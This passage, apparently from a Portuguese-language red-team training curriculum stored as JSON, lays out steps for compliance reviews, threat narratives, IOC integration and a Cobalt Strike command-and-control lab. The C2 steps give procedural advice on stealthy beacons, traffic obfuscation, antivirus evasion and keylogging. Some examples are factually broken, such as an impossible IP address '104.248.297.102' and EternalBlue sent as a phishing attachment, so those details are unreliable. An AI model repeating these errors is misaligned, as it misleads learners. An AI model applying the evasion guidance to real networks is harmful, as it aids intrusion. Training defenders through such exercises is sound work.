                                    "Mapear elementos do cenário: dados manipulados, alvos simulados e ações planejadas.",
                                    "Verificar se há coleta/tratamento de dados pessoais reais ou fictícios sem base legal.",
                                    "Avaliar potenciais violações éticas, como falta de consentimento ou risco de dano real.",
                                    "Classificar riscos em alta/média/baixa probabilidade e impacto.",
                                    "Documentar riscos em uma matriz de análise."
                                  ],
                                  "verification": "Matriz de riscos preenchida com pelo menos 5 itens identificados e classificados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Descrição do cenário de ameaça, template de matriz de riscos (Excel/Google Sheets).",
                                  "tips": "Pense como um auditor: pergunte 'e se isso fosse real?' para cada ação.",
                                  "learningObjective": "Identificar proativamente riscos jurídicos e éticos em cenários de simulação.",
                                  "commonMistakes": "Subestimar riscos éticos intangíveis, como reputação, ou focar só em leis técnicas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver medidas de conformidade e salvaguardas",
                                  "subSteps": [
                                    "Definir regras de engajamento claras com cláusulas de consentimento e limites.",
                                    "Implementar anonimização de dados e uso exclusivo de dados fictícios.",
                                    "Criar protocolos de 'pânico' para interrupção imediata em caso de risco real.",
                                    "Estabelecer plano de relatório e divulgação responsável de vulnerabilidades.",
                                    "Validar medidas com um checklist de conformidade."
                                  ],
                                  "verification": "Regras de engajamento e checklist revisados e aprovados por pares.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Templates de regras de engajamento, exemplos de consentimento forms.",
                                  "tips": "Envolva stakeholders jurídicos cedo; priorize 'fail-safe' mechanisms.",
                                  "learningObjective": "Criar salvaguardas práticas que mitiguem riscos identificados.",
                                  "commonMistakes": "Criar regras vagas ou não testáveis, como 'evitar danos' sem métricas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar revisão final e documentar conformidade",
                                  "subSteps": [
                                    "Simular revisão por terceiros: aplicar checklist completo ao cenário.",
                                    "Corrigir gaps identificados e reavaliar riscos.",
                                    "Gerar relatório de conformidade com evidências e assinaturas.",
                                    "Arquivar documentos para auditorias futuras.",
                                    "Refletir sobre lições aprendidas para cenários futuros."
                                  ],
                                  "verification": "Relatório final assinado e arquivado, com 100% de checklist aprovado.",
                                  "estimatedTime": "1 hora",
                                  "materials": "Checklist de conformidade, software de versionamento (Google Docs).",
                                  "tips": "Use version control para rastrear mudanças; revise com olhos frescos após pausa.",
                                  "learningObjective": "Garantir e provar conformidade através de documentação auditável.",
                                  "commonMistakes": "Documentar superficialmente ou pular simulação de revisão externa."
                                }
                              ],
                              "practicalExample": "Ao planejar um jogo de guerra cibernética simulando phishing em uma empresa, revisar se e-mails fictícios usam dados anonimizados, obter consentimento escrito dos participantes e incluir cláusula de não divulgação de dados reais, alinhando com LGPD Art. 7º (bases legais) e evitando multas por violação de privacidade.",
                              "finalVerifications": [
                                "Checklist de LGPD 100% aprovado sem violações.",
                                "Regras de engajamento assinadas por todos os envolvidos.",
                                "Riscos éticos mitigados com protocolos de interrupção.",
                                "Relatório de conformidade arquivado e auditável.",
                                "Simulação de revisão externa aprovada.",
                                "Glossário e matriz de riscos completos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pelo menos 80% dos riscos relevantes.",
                                "Completude das medidas de salvaguarda (todas substeps executadas).",
                                "Qualidade da documentação (clara, citada e auditável).",
                                "Alinhamento total com LGPD e princípios éticos.",
                                "Criatividade em conexões práticas e real-world.",
                                "Tempo respeitado e eficiência nos steps."
                              ],
                              "crossCurricularConnections": [
                                "Direito Digital: Aplicação prática de LGPD em TI.",
                                "Ética Profissional: Princípios de conduta em cibersegurança.",
                                "Gestão de Riscos: Metodologias como ISO 31000.",
                                "Governança Corporativa: Compliance em operações de TI."
                              ],
                              "realWorldApplication": "Em operações de Red Team para bancos ou órgãos públicos, garante que simulações de ataques não resultem em processos judiciais, como os casos de multas ANPD por vazamentos em testes não autorizados, protegendo a organização e habilitando certificações como OSCP ética."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.3",
                        "name": "Construção e Validação de Cenários",
                        "description": "Desenvolvimento passo a passo de narrativas de ameaça realistas e validação para simulações em ambientes de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.3.1",
                            "name": "Criar narrativas de ameaça detalhadas",
                            "description": "Construir histórias fictícias mas baseadas em eventos reais, incluindo fases de reconhecimento, exploração e exfiltração, com timelines e vetores de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar Eventos Reais de Ameaças Cibernéticas",
                                  "subSteps": [
                                    "Identifique incidentes reais recentes reportados em fontes confiáveis como MITRE ATT&CK, relatórios da CERT.br ou notícias de cibersegurança.",
                                    "Extraia componentes chave: atores envolvidos, motivações, vetores iniciais de acesso e impactos.",
                                    "Categorize as fases do ataque (reconhecimento, exploração, exfiltração) com base em frameworks como Cyber Kill Chain.",
                                    "Anote timelines aproximadas e ferramentas usadas nos eventos reais.",
                                    "Compile uma lista de 3-5 eventos semelhantes para basear a narrativa fictícia."
                                  ],
                                  "verification": "Verifique se possui pelo menos 3 fontes citadas e um resumo de 1 página com componentes extraídos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "MITRE ATT&CK Navigator",
                                    "Relatórios de incidentes (ex: Verizon DBIR)"
                                  ],
                                  "tips": "Priorize eventos recentes (últimos 2 anos) para relevância; use ferramentas de busca avançada como Google Scholar.",
                                  "learningObjective": "Compreender padrões reais de ameaças para fundamentar narrativas fictícias realistas.",
                                  "commonMistakes": [
                                    "Usar fontes não confiáveis",
                                    "Ignorar motivações dos atores",
                                    "Não documentar fontes"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estruturar as Fases da Narrativa de Ameaça",
                                  "subSteps": [
                                    "Defina o ator da ameaça (ex: APT grupo estatal) e motivação (ex: roubo de IP).",
                                    "Descreva a fase de reconhecimento: scanning de rede, OSINT sobre alvos.",
                                    "Detalhe a fase de exploração: exploits, credenciais roubadas, movimento lateral.",
                                    "Inclua a fase de exfiltração: extração de dados, limpeza de rastros.",
                                    "Adicione impactos potenciais e resposta hipotética."
                                  ],
                                  "verification": "Crie um outline com as 4 fases principais descritas em bullet points.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Framework Cyber Kill Chain (PDF ou site)",
                                    "Template de narrativa em Google Docs"
                                  ],
                                  "tips": "Mantenha a estrutura sequencial e lógica; use verbos ativos para dinamismo.",
                                  "learningObjective": "Mapear fases de ataque em uma estrutura narrativa coerente.",
                                  "commonMistakes": [
                                    "Pular fases iniciais",
                                    "Tornar fases muito genéricas",
                                    "Ignorar persistência"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Timeline e Vetores de Ataque Detalhados",
                                  "subSteps": [
                                    "Crie uma timeline cronológica com datas/horas fictícias para cada ação (ex: Dia 1: Reconhecimento via Shodan).",
                                    "Especifique vetores: phishing com spear-phishing, exploit de vulnerabilidade CVE específica.",
                                    "Inclua ferramentas reais (ex: Metasploit, Cobalt Strike) e táticas (TTPs do MITRE).",
                                    "Quantifique dados: volume exfiltrado, número de sistemas comprometidos.",
                                    "Integre elementos de evasão como C2 channels obfuscados."
                                  ],
                                  "verification": "Gere um diagrama de timeline (usando tools como Lucidchart ou Draw.io) com pelo menos 10 eventos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "MITRE ATT&CK Matrix",
                                    "Ferramenta de diagramação (Draw.io)",
                                    "Lista de CVEs recentes"
                                  ],
                                  "tips": "Use Gantt charts para visualização; alinhe com TTPs reais para credibilidade.",
                                  "learningObjective": "Construir sequências temporais precisas e vetores técnicos realistas.",
                                  "commonMistakes": [
                                    "Timeline irrealista (ex: exfiltração em horas)",
                                    "Vetores genéricos sem TTPs",
                                    "Falta de quantificação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Redigir e Refinar a Narrativa Completa",
                                  "subSteps": [
                                    "Escreva a narrativa em prosa fictícia, incorporando timeline e vetores.",
                                    "Adicione detalhes sensoriais e drama para engajamento (ex: tensão no SOC).",
                                    "Revise por consistência: verifique alinhamento com eventos reais.",
                                    "Inclua lições aprendidas e recomendações de mitigação.",
                                    "Formate com seções claras e anexos (timeline, diagrama)."
                                  ],
                                  "verification": "Produza um documento final de 2-3 páginas com narrativa coesa.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de texto (Google Docs)",
                                    "Ferramenta de revisão (Grammarly)"
                                  ],
                                  "tips": "Leia em voz alta para fluidez; peça feedback de pares.",
                                  "learningObjective": "Transformar dados técnicos em narrativa envolvente e educativa.",
                                  "commonMistakes": [
                                    "Texto técnico demais sem narrativa",
                                    "Inconsistências na timeline",
                                    "Omitir mitigação"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar a Narrativa Contra Critérios de Realismo",
                                  "subSteps": [
                                    "Compare com frameworks (MITRE, Kill Chain) para cobertura de fases.",
                                    "Simule walkthrough com colega para detectar gaps.",
                                    "Verifique plausibilidade técnica com experts ou fóruns.",
                                    "Ajuste baseando em feedback: adicione detalhes faltantes.",
                                    "Documente validações em um relatório de revisão."
                                  ],
                                  "verification": "Obtenha aprovação de 1-2 revisores confirmando realismo.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Checklist de validação (template próprio)",
                                    "Fórum de cibersegurança (Reddit r/netsec)"
                                  ],
                                  "tips": "Use rubrica de avaliação pré-definida; foque em gaps de realismo.",
                                  "learningObjective": "Garantir que a narrativa seja acionável e precisa para treinamentos.",
                                  "commonMistakes": [
                                    "Pular validação",
                                    "Ignorar feedback técnico",
                                    "Não documentar mudanças"
                                  ]
                                }
                              ],
                              "practicalExample": "Narrativa exemplo: 'Em 15/03/2024, o grupo APT28 inicia reconhecimento via OSINT no LinkedIn da empresa XYZ, identificando o CEO como alvo. Dia 2: Envio de spear-phishing com anexo exploit EternalBlue (CVE-2017-0144), ganhando foothold no servidor Exchange. Dia 5: Movimento lateral via RDP para 10 estações, exfiltrando 500GB de dados IP via C2 em Mega.nz disfarçado. Timeline: Reconhecimento (2 dias), Exploração (3 dias), Exfiltração (1 dia). Mitigação: MFA e EDR.'",
                              "finalVerifications": [
                                "Narrativa cobre todas as fases: reconhecimento, exploração, exfiltração.",
                                "Timeline cronológica com pelo menos 8-10 eventos datados.",
                                "Vetores de ataque referenciam TTPs reais (ex: MITRE IDs).",
                                "Inclui motivação do ator e impactos quantificados.",
                                "Possui seção de lições e mitigação.",
                                "Documento formatado com diagramas e fontes citadas."
                              ],
                              "assessmentCriteria": [
                                "Realismo técnico (alinhamento com eventos reais: 30%)",
                                "Estrutura e coerência narrativa (25%)",
                                "Detalhamento de timeline e vetores (20%)",
                                "Engajamento e clareza (15%)",
                                "Validação e mitigação incluídas (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Escrita Criativa: Construção de histórias envolventes.",
                                "História: Análise de eventos passados para padrões.",
                                "Análise de Dados: Timeline e quantificação de impactos.",
                                "Comunicação: Apresentação de cenários complexos.",
                                "Ética: Discussão de implicações de simulações de ataques."
                              ],
                              "realWorldApplication": "Usado em Red Team exercises, treinamentos de SOC, jogos de guerra cibernética e relatórios de threat intelligence para preparar equipes de defesa contra ataques realistas."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.2",
                            "name": "Integrar indicadores de compromisso (IOCs)",
                            "description": "Incorporar IOCs realistas como hashes de malware, IPs de C2 e padrões de tráfego para enriquecer cenários e treinar detecção.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Coletar IOCs Realistas",
                                  "subSteps": [
                                    "Identifique fontes confiáveis como VirusTotal, AlienVault OTX e MITRE ATT&CK.",
                                    "Busque hashes de malware recentes relacionados ao cenário (ex: SHA-256 de ransomware).",
                                    "Colete IPs de servidores C2 ativos de relatórios de threat intelligence.",
                                    "Registre padrões de tráfego suspeitos, como portas usadas ou user-agents anormais.",
                                    "Documente pelo menos 5 IOCs com data de coleta e fonte."
                                  ],
                                  "verification": "Lista documentada de IOCs com fontes e relevância ao cenário.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Acesso à internet",
                                    "VirusTotal",
                                    "AlienVault OTX",
                                    "MITRE ATT&CK Navigator"
                                  ],
                                  "tips": "Priorize IOCs recentes (últimos 6 meses) e filtre por TTPs do cenário.",
                                  "learningObjective": "Aprender a sourcing de IOCs autênticos e atualizados.",
                                  "commonMistakes": [
                                    "Usar IOCs fictícios ou desatualizados",
                                    "Ignorar verificação de falsos positivos",
                                    "Coletar IOCs irrelevantes ao contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Categorizar e Validar IOCs",
                                  "subSteps": [
                                    "Classifique IOCs por tipo: hash, IP, domínio, padrão de tráfego ou YARA rule.",
                                    "Valide hashes no VirusTotal para confirmar atividade maliciosa.",
                                    "Teste conectividade de IPs C2 em ambiente isolado (ex: Wireshark).",
                                    "Analise padrões de tráfego com ferramentas como Zeek para realismo.",
                                    "Crie um relatório de validação com scores de confiança (alta/média/baixa)."
                                  ],
                                  "verification": "Relatório de categorização com validação e scores de confiança para cada IOC.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "VirusTotal API",
                                    "Wireshark",
                                    "Zeek",
                                    "Planilha Excel ou Google Sheets"
                                  ],
                                  "tips": "Use IOCs com alta prevalência em relatórios reais para maior realismo.",
                                  "learningObjective": "Desenvolver habilidades de validação e categorização de IOCs.",
                                  "commonMistakes": [
                                    "Não validar IOCs (risco de falsos positivos)",
                                    "Misturar tipos sem categorização clara",
                                    "Ignorar variações regionais de IOCs"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Integrar IOCs no Cenário de Ameaça",
                                  "subSteps": [
                                    "Mapeie IOCs às fases do kill chain (ex: hash na fase de execução).",
                                    "Incorpore hashes em payloads simulados de malware.",
                                    "Configure IPs C2 em regras de firewall ou scripts de simulação.",
                                    "Injete padrões de tráfego em logs ou pacotes de rede simulados.",
                                    "Atualize o documento do cenário com IOCs integrados e narrativa."
                                  ],
                                  "verification": "Cenário atualizado com IOCs mapeados e exemplos de uso.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Editor de texto",
                                    "Ferramentas de simulação como Atomic Red Team",
                                    "Documentação do cenário"
                                  ],
                                  "tips": "Garanta que IOCs fluam logicamente na narrativa do ataque.",
                                  "learningObjective": "Integrar IOCs de forma realista em cenários de jogos de guerra.",
                                  "commonMistakes": [
                                    "Sobrecarregar o cenário com IOCs excessivos",
                                    "Não alinhar IOCs com TTPs",
                                    "Integrar sem contexto narrativo"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar e Validar a Integração",
                                  "subSteps": [
                                    "Execute o cenário em ambiente virtual (ex: VM com SIEM).",
                                    "Verifique detecção de IOCs via ferramentas como Splunk ou ELK Stack.",
                                    "Colete métricas de detecção (taxa de acerto, falsos positivos).",
                                    "Ajuste IOCs com base em testes para otimizar realismo.",
                                    "Documente lições aprendidas e exporte IOCs em formato STIX."
                                  ],
                                  "verification": "Relatório de teste com evidências de detecção e ajustes realizados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ambiente virtual (VirtualBox/VMware)",
                                    "SIEM gratuito (Splunk Free)",
                                    "STIX Tools"
                                  ],
                                  "tips": "Teste em iterações curtas para refinar rapidamente.",
                                  "learningObjective": "Validar eficácia da integração de IOCs em cenários treináveis.",
                                  "commonMistakes": [
                                    "Pular testes reais",
                                    "Ignorar falsos positivos",
                                    "Não exportar em formatos padrão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de ransomware WannaCry, integre o hash SHA-256: 24d004a104695e5ee1... (do exploit EternalBlue), IP C2 104.248.297.102 e padrão de tráfego SMBv1 na porta 445 para simular infecção e detecção via EDR.",
                              "finalVerifications": [
                                "Cenário contém pelo menos 5 IOCs validados e categorizados.",
                                "Integração permite detecção em pelo menos 80% dos testes.",
                                "Relatório completo com fontes, validações e lições aprendidas.",
                                "IOCs exportados em formato STIX/TAXII para compartilhamento.",
                                "Narrativa do cenário enriquecida e realista."
                              ],
                              "assessmentCriteria": [
                                "Precisão e atualidade dos IOCs coletados (nota 1-10).",
                                "Qualidade da categorização e validação (ausência de falsos positivos).",
                                "Coerência da integração com o kill chain.",
                                "Eficácia nos testes de detecção (métricas quantificadas).",
                                "Documentação clara e profissional.",
                                "Criatividade no uso de IOCs para enriquecer o cenário."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Processamento de logs e padrões de tráfego.",
                                "Programação: Criação de scripts para injeção de IOCs (Python/YARA).",
                                "Inteligência Artificial: Uso de ML para priorizar IOCs.",
                                "Redes: Compreensão de protocolos e tráfego suspeito.",
                                "Gestão de Projetos: Documentação e iteração em cenários."
                              ],
                              "realWorldApplication": "Em SOCs para threat hunting, exercícios Red Team/Blue Team e validação de regras de detecção em empresas, permitindo treinamento realista contra ameaças como APTs e ransomware."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.3",
                            "name": "Simular comando e controle cibernético",
                            "description": "Planejar estruturas de C2 usando ferramentas como Cobalt Strike, definindo canais de comunicação persistentes e comandos para operações simuladas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar o Servidor Cobalt Strike",
                                  "subSteps": [
                                    "Baixe e instale o Cobalt Strike em um ambiente isolado (VM ou lab dedicado).",
                                    "Gere um novo Team Server com chaves de licença válidas para uso educacional.",
                                    "Configure o listener inicial (HTTP/HTTPS) com portas e certificados autoassinados.",
                                    "Inicie o cliente Cobalt Strike e conecte ao Team Server.",
                                    "Verifique logs iniciais para confirmar que o servidor está operacional."
                                  ],
                                  "verification": "Cliente Cobalt Strike se conecta ao Team Server sem erros e exibe painel principal.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Cobalt Strike (versão trial ou educacional)",
                                    "Máquina virtual isolada (Kali Linux ou Windows)",
                                    "Certificados SSL autoassinados"
                                  ],
                                  "tips": "Use sempre ambientes isolados para evitar exposição real; configure firewall para bloquear tráfego externo.",
                                  "learningObjective": "Entender a arquitetura básica do Cobalt Strike e preparar o ambiente para simulações C2.",
                                  "commonMistakes": [
                                    "Executar em rede não isolada",
                                    "Esquecer de gerar certificados válidos",
                                    "Usar portas padrão sem ofuscação"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Projetar a Estrutura de Comando e Controle (C2)",
                                  "subSteps": [
                                    "Defina objetivos da operação simulada (ex: persistência em rede corporativa fictícia).",
                                    "Planeje canais de comunicação: HTTP, DNS, SMB com redirecionamentos.",
                                    "Especifique persistência: sleep masks, jitter, user-profile tasks.",
                                    "Crie um diagrama de fluxo C2 (ferramentas como Draw.io).",
                                    "Documente kill-chains e comandos esperados."
                                  ],
                                  "verification": "Diagrama de C2 completo com canais, persistência e fluxos documentados.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io ou Lucidchart)",
                                    "Documentação oficial Cobalt Strike"
                                  ],
                                  "tips": "Priorize stealth: use domínios DGA-like e evite beacons óbvios.",
                                  "learningObjective": "Desenvolver habilidades em planejamento estratégico de infraestruturas C2 adversárias.",
                                  "commonMistakes": [
                                    "Ignorar detecção por AV/EDR",
                                    "Canais não redundantes",
                                    "Persistência frágil a reinicializações"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Configurar Beacons e Comunicação Persistente",
                                  "subSteps": [
                                    "Crie profiles Malleable C2 para ofuscar tráfego.",
                                    "Configure listeners múltiplos no Team Server.",
                                    "Gere stagers (executáveis, DLLs) para alvos simulados (VMs Windows/Linux).",
                                    "Implante beacons em VMs vítimas e estabeleça check-ins.",
                                    "Ajuste sleep/jitter para simular tráfego realista."
                                  ],
                                  "verification": "Beacons check-in persistentemente sem desconexões por 30 minutos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VMs vítimas (Windows 10, Ubuntu)",
                                    "Profiles Malleable C2 sample",
                                    "Metasploit para payloads iniciais"
                                  ],
                                  "tips": "Teste em loop: deploy > check-in > adjust; monitore Wireshark para vazamentos.",
                                  "learningObjective": "Dominar configuração de comunicação C2 stealth e persistente.",
                                  "commonMistakes": [
                                    "Profiles Malleable mal configurados",
                                    "Jitter zero causando detecção",
                                    "Stagers detectados por AV"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Definir e Testar Comandos de Operação",
                                  "subSteps": [
                                    "Crie comandos customizados: keylogger, screenshot, privilege escalation.",
                                    "Configure scripts Aggressor para automação (ex: lateral movement).",
                                    "Teste comandos em beacons ativos: execute, valide saída.",
                                    "Implemente C2 callbacks para exfiltração simulada.",
                                    "Registre logs de todos os comandos executados."
                                  ],
                                  "verification": "Todos comandos testados retornam resultados esperados sem crashes.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Scripts Aggressor examples",
                                    "Ferramentas de teste (PowerShell Empire para inspiração)"
                                  ],
                                  "tips": "Use 'beacon> help' para explorar; chain comandos para cenários realistas.",
                                  "learningObjective": "Habilitar execução de operações C2 complexas via comandos estruturados.",
                                  "commonMistakes": [
                                    "Comandos não idempotentes",
                                    "Falta de handling de erros",
                                    "Exfil sem criptografia"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Executar e Validar Simulação Completa de C2",
                                  "subSteps": [
                                    "Inicie operação end-to-end: infecção > C2 > comandos > exfil.",
                                    "Monitore detecções em ferramentas defensivas (SIEM simulado).",
                                    "Ajuste baseado em falhas observadas.",
                                    "Gere relatório de operação com métricas (TTPs cobertos).",
                                    "Cleanup: mate beacons e limpe artefatos."
                                  ],
                                  "verification": "Simulação completa executada com relatório gerado e cleanup confirmado.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de monitoramento (Wireshark, Zeek)",
                                    "Template de relatório MITRE ATT&CK"
                                  ],
                                  "tips": "Registre tudo em vídeo para revisão; foque em dwell time longo.",
                                  "learningObjective": "Integrar todos elementos em uma simulação C2 holística e validada.",
                                  "commonMistakes": [
                                    "Sem cleanup levando a persistência real",
                                    "Ignorar logs defensivos",
                                    "Relatório incompleto"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab de Red Team, configure um Cobalt Strike C2 server para controlar 3 VMs vítimas representando uma rede corporativa. Implante beacons via phishing simulado, execute comandos para escalada de privilégios e exfiltre 'dados sensíveis' via DNS tunneling, mantendo persistência por 1 hora sem detecção.",
                              "finalVerifications": [
                                "Servidor C2 operacional com beacons persistentes conectados.",
                                "Todos canais de comunicação funcionais e stealth.",
                                "Comandos customizados executados com sucesso em múltiplos beacons.",
                                "Simulação completa documentada com logs e diagrama.",
                                "Cleanup total sem artefatos residuais.",
                                "Relatório inclui TTPs MITRE ATT&CK mapeados."
                              ],
                              "assessmentCriteria": [
                                "Precisão e stealth da infraestrutura C2 (sem detecções óbvias).",
                                "Persistência mantida sob condições simuladas (reinicializações, jitter).",
                                "Efetividade dos comandos em cenários realistas.",
                                "Documentação completa e diagramação clara.",
                                "Adesão a boas práticas éticas e de isolamento.",
                                "Tempo de dwell e evasão demonstrados."
                              ],
                              "crossCurricularConnections": [
                                "Redes e Protocolos: Configuração de HTTP/DNS tunneling.",
                                "Programação: Scripts Aggressor em Java-like.",
                                "Análise de Malware: Compreensão de beacons e payloads.",
                                "Ética e Direito: Limites legais em simulações cibernéticas.",
                                "Gestão de Projetos: Planejamento de operações C2."
                              ],
                              "realWorldApplication": "Em exercícios de Red Teaming e Purple Teaming, simulações C2 com Cobalt Strike treinam equipes de defesa a detectar e mitigar APTs persistentes, como vistos em campanhas reais de nation-states (ex: SolarWinds), melhorando readiness operacional sem riscos reais."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.4",
                            "name": "Validar cenários com walkthroughs",
                            "description": "Realizar revisões e testes em papel ou dry-run para verificar viabilidade, realismo e alinhamento com ROE antes da execução.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar a sessão de walkthrough",
                                  "subSteps": [
                                    "Reunir equipe multidisciplinar (atacantes, defensores, analistas e stakeholders)",
                                    "Documentar o cenário completo, incluindo fluxos, timelines e ROE",
                                    "Preparar materiais visuais como diagramas, fluxogramas e checklists",
                                    "Definir papéis para cada participante e regras da simulação",
                                    "Estabelecer objetivos claros de validação (viabilidade, realismo, alinhamento)"
                                  ],
                                  "verification": "Checklist de preparação assinado por todos os participantes",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documento do cenário",
                                    "Diagramas impressos ou digitais",
                                    "ROE em papel",
                                    "Quadro branco ou ferramenta colaborativa como Miro"
                                  ],
                                  "tips": "Garanta diversidade de perspectivas para cobrir ângulos cegos",
                                  "learningObjective": "Configurar um ambiente colaborativo otimizado para validação detalhada",
                                  "commonMistakes": [
                                    "Omitir participantes chave",
                                    "Não revisar ROE previamente",
                                    "Preparação superficial de materiais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar o dry-run sequencial",
                                  "subSteps": [
                                    "Iniciar simulação passo a passo do cenário, narrando ações em voz alta",
                                    "Registrar tempos reais de cada ação e transições",
                                    "Simular respostas de sistemas, redes e humanos conforme o plano",
                                    "Pausar em pontos críticos para discutir interações",
                                    "Manter registro em tempo real de eventos no quadro ou ferramenta"
                                  ],
                                  "verification": "Registro completo do dry-run com timestamps e ações narradas",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Cronômetro",
                                    "Quadro branco",
                                    "Marcadores",
                                    "Ferramentas de desenho colaborativo"
                                  ],
                                  "tips": "Use 'o que acontece se...' para explorar ramificações inesperadas",
                                  "learningObjective": "Simular o cenário de forma realista para identificar fluxos naturais",
                                  "commonMistakes": [
                                    "Avançar rápido sem pausas",
                                    "Ignorar detalhes técnicos",
                                    "Não narrar ações claramente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar problemas e gaps",
                                  "subSteps": [
                                    "Analisar o dry-run para detectar inconsistências lógicas ou técnicas",
                                    "Verificar viabilidade (recursos, tempos realistas) e realismo (comportamentos humanos/sistemas)",
                                    "Avaliar alinhamento com ROE, identificando violações potenciais",
                                    "Priorizar gaps por impacto (crítico, médio, baixo)",
                                    "Brainstorm soluções iniciais para cada problema identificado"
                                  ],
                                  "verification": "Lista de gaps categorizados com prioridades e sugestões iniciais",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Planilha de gaps (Google Sheets ou Excel)",
                                    "ROE de referência"
                                  ],
                                  "tips": "Use votação em grupo para priorizar issues imparciais",
                                  "learningObjective": "Desenvolver habilidades analíticas para diagnosticar falhas em cenários complexos",
                                  "commonMistakes": [
                                    "Subestimar impactos de gaps pequenos",
                                    "Não questionar premissas do cenário",
                                    "Debates não produtivos sem facilitação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Documentar achados e propor ajustes",
                                  "subSteps": [
                                    "Compilar relatório com gaps, verificações e recomendações",
                                    "Definir ações corretivas claras, responsáveis e prazos",
                                    "Validar ajustes com uma revisão rápida do walkthrough revisado",
                                    "Arquivar documentação para futuras referências",
                                    "Coletar feedback da equipe sobre o processo"
                                  ],
                                  "verification": "Relatório final aprovado pela equipe e arquivado",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Template de relatório",
                                    "Ferramenta de versionamento como Git ou Google Docs"
                                  ],
                                  "tips": "Mantenha o relatório conciso mas acionável, com evidências do dry-run",
                                  "learningObjective": "Consolidar lições aprendidas em outputs reutilizáveis",
                                  "commonMistakes": [
                                    "Relatório vago sem ações específicas",
                                    "Não incluir evidências",
                                    "Ignorar feedback pós-sessão"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de jogo de guerra cibernética simulando um ataque de ransomware a uma empresa fictícia, a equipe realiza um walkthrough: o atacante explora uma vulnerabilidade no email (dry-run: simular phishing em 5 minutos), propaga via rede interna (verificar firewalls reais), e exige resgate. Identificam gap: tempo de propagação irrealista (ajustam para 2 horas baseado em testes reais). Alinhamento com ROE confirmado ao pausar ações ilegais fora do escopo.",
                              "finalVerifications": [
                                "Todos os passos do cenário foram simulados sem bloqueios lógicos",
                                "Gaps de viabilidade e realismo foram identificados e priorizados",
                                "Alinhamento total com ROE sem violações detectadas",
                                "Relatório de ajustes criado com ações atribuídas",
                                "Equipe concorda que o cenário está pronto para execução",
                                "Feedback coletado confirma eficácia do processo"
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de pelo menos 80% dos gaps reais",
                                "Qualidade e completude da documentação (checklist preenchido)",
                                "Eficiência temporal: conclusão dentro do estimado",
                                "Participação colaborativa e contribuições equilibradas",
                                "Criatividade nas soluções propostas para gaps",
                                "Adesão rigorosa às ROE durante o dry-run"
                              ],
                              "crossCurricularConnections": [
                                "Análise de riscos e gestão de projetos (identificação e priorização de gaps)",
                                "Engenharia de software (testes e validação de fluxos)",
                                "Psicologia comportamental (simulação de respostas humanas)",
                                "Comunicação e facilitação de grupos (condução de sessões colaborativas)"
                              ],
